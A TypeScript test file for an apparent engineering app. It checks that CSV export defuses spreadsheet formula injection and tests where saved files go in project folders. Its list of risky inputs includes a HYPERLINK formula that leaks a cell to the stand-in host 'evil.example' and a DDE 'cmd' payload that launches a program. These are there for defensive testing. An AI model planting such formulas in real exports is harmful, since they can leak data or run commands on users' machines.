import { afterEach, describe, expect, it, vi } from 'vitest';
import { placeFor, toCsv } from './files';
import { builtInTemplate } from '../model/folderTemplateBuiltins';
import type { Project } from '../types';

/** The cells of the first data row, as a spreadsheet reads them: quotes removed and doubled quotes undone. */
function firstRow(csv: string): string[] {
  const row = csv.slice(csv.indexOf('\r\n') + 2);
  const out: string[] = [];
  for (let i = 0; i <= row.length;) {
    if (row[i] === '"') {
      let v = '';
      for (i++; i < row.length; i++) {
        if (row[i] === '"' && row[i + 1] === '"') { v += '"'; i++; } else if (row[i] === '"') { i++; break; } else v += row[i];
      }
      out.push(v);
      i++; // the comma
    } else {
      const end = row.indexOf(',', i) < 0 ? row.length : row.indexOf(',', i);
      out.push(row.slice(i, end));
      i = end + 1;
    }
  }
  return out;
}

describe('CSV cells a spreadsheet could run as a formula (CSV injection)', () => {
  const risky = [
    '=1+1', '+1+1', '-1+1', '@SUM(A1:A9)', '=HYPERLINK("https://evil.example/?d="&A1,"Open")', "-2+3+cmd|' /C calc'!A0",
    ' =1+1', '\u00a0=1+1', '\u0001=1+1', '\t=1+1', '\n=1+1', '\r=1+1', '\tplain text', '\rplain text', '\uff1d1+1', '\uff0b1+1', '\uff0d1+1', '\uff20SUM(A1)'
  ];

  it('start with an apostrophe, so they open as text, and keep their content', () => {
    const csv = toCsv(risky.map((_, i) => `c${i}`), [risky]);
    expect(firstRow(csv)).toEqual(risky.map((v) => `'${v}`));
  });

  it('leave numbers, dashes and ordinary text as they were', () => {
    const safe = ['-0.5', '+3', '1e-7', '-1.20', ' -5 ', '-', '--', '', 'DB-GF1', 'a=b', '4 mm²', '—', '\u22125', 'Circuit 1, spare'];
    expect(firstRow(toCsv(safe.map((_, i) => `c${i}`), [safe]))).toEqual(safe);
    expect(toCsv(['a', 'b', 'c'], [[-5, -0.25, 0]])).toBe('\uFEFFa,b,c\r\n-5,-0.25,0');
    expect(toCsv(['a', 'b', 'c'], [['=1+1', -5, 'say "hi", ok']])).toBe('\uFEFFa,b,c\r\n\'=1+1,-5,"say ""hi"", ok"');
  });

  it('are not slipped into a new cell by a semicolon or tab (the cell separator in some spreadsheets)', () => {
    expect(toCsv(['a', 'b'], [['x;=1+1', 'y\t=1+1']])).toBe('\uFEFFa,b\r\n"x;=1+1","y\t=1+1"');
  });
});

describe('where a save opens in a project folder (spec F2)', () => {
  const folder = { templateId: 'consultant-full', version: 1, template: builtInTemplate('consultant-full')! };
  const project = { id: 'p9', name: 'Villa', studyReport: { projectNo: 'P2611' }, folder } as unknown as Project;
  const memory = () => {
    const m = new Map<string, string>();
    return { m, s: { getItem: (k: string) => m.get(k) ?? null, setItem: (k: string, v: string) => { m.set(k, v); }, removeItem: (k: string) => { m.delete(k); } } };
  };
  afterEach(() => { vi.unstubAllGlobals(); });

  it('keeps the old name without a context or a project folder', async () => {
    expect((await placeFor('a.pdf', 'pdf', undefined, false)).name).toBe('a.pdf');
    expect((await placeFor('a.pdf', 'pdf', { output: 'vdReport', project: { ...project, folder: undefined } }, false))).toMatchObject({ name: 'a.pdf' });
  });
  it('gives the browser version the naming rule\'s name and no folder', async () => {
    const p = await placeFor('a.pdf', 'pdf', { output: 'vdReport', project }, true);
    expect(p.name).toMatch(/^P2611-E-CAL-004/);
    expect(p.defaultDir).toBeUndefined();
  });
  it('makes a missing role folder first, then suggests it, and remembers another folder the user picked', async () => {
    const { m, s } = memory();
    s.setItem('lvds.projectFolder.p9', JSON.stringify({ root: '/jobs/P2611_Villa', unticked: [] }));
    const create = vi.fn(async () => ({ root: '/jobs/P2611_Villa', rootMade: false, created: 1, existed: 1, failed: [] }));
    const status = vi.fn(async () => ({ root: '/jobs/P2611_Villa', exists: true, present: [], missing: ['05_Calcs/02_Volt_Drop'], looseFiles: [], looseCount: 0 }));
    vi.stubGlobal('localStorage', s);
    vi.stubGlobal('window', { lvds: { projectFolders: { create, status } } });
    const p = await placeFor('a.pdf', 'pdf', { output: 'vdReport', project }, false);
    expect(create).toHaveBeenCalledWith('/jobs/P2611_Villa', ['05_Calcs/02_Volt_Drop']);
    expect(p.defaultDir).toBe('/jobs/P2611_Villa/05_Calcs/02_Volt_Drop');
    p.after('/elsewhere/P2611-E-CAL-004.pdf');
    expect(JSON.parse(m.get('lvds.projectFolderChoices.p9')!)).toEqual({ calcVd: '/elsewhere' });
    const again = await placeFor('a.pdf', 'pdf', { output: 'vdReport', project }, false);
    expect(again.defaultDir).toBe('/elsewhere');
    expect(create).toHaveBeenCalledTimes(1);
  });
  it('falls back to the Projects folder when the project folder is missing or a folder cannot be made', async () => {
    const { s } = memory();
    s.setItem('lvds.projectFolder.p9', JSON.stringify({ root: '/jobs/P2611_Villa', unticked: [] }));
    const create = vi.fn(async () => ({ root: '/jobs/P2611_Villa', rootMade: false, created: 0, existed: 1, failed: [{ path: 'x', reason: 'no' }] }));
    vi.stubGlobal('localStorage', s);
    vi.stubGlobal('window', { lvds: { projectFolders: { create, status: async () => ({ exists: false, present: [], missing: [] }) } } });
    expect((await placeFor('a.pdf', 'pdf', { output: 'vdReport', project }, false)).defaultDir).toBeUndefined();
    expect(create).not.toHaveBeenCalled();
    vi.stubGlobal('window', { lvds: { projectFolders: { create, status: async () => ({ exists: true, present: [], missing: ['05_Calcs/02_Volt_Drop'] }) } } });
    expect((await placeFor('a.pdf', 'pdf', { output: 'vdReport', project }, false)).defaultDir).toBeUndefined();
  });
});
